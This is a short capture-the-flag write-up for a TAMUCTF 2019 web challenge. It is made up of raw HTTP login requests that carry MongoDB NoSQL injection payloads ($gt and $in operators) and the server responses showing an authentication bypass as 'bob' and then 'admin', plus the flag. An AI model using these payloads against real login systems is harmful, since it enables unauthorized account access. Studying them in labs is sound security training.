## TAMUCTF 2019 Web


https://docs.mongodb.com/manual/reference/operator/query/gt/


POST /login HTTP/1.1
Host: web4.tamuctf.com
Content-Length: 58
Accept: text/plain
Content-Type: application/json;charset=UTF-8
Referer: http://web4.tamuctf.com/admin
Connection: close

{"username":{"$gt":""},"password":{"$gt":""}}


HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 01 Mar 2019 19:42:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 15
Connection: close
X-Powered-By: Express
ETag: W/"f-19Ag+XhEyRc+UOhG3N8S4DGKLw4"

"Welcome: bob!"



https://docs.mongodb.com/manual/reference/operator/query/in/#op._S_in



POST /login HTTP/1.1
Host: web4.tamuctf.com
Content-Length: 58
Accept: text/plain
Content-Type: application/json;charset=UTF-8
Referer: http://web4.tamuctf.com/admin
Connection: close

{"username":{"$in":["tamuctf", "flag", "admin", "root", "administrator"]},"password":{"$gt":""}}

HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 01 Mar 2019 19:43:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 62
Connection: close
X-Powered-By: Express
ETag: W/"3e-PIL9X7plTu9Obxi0Yd4AQFTvkcU"

"Welcome: admin!\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}"

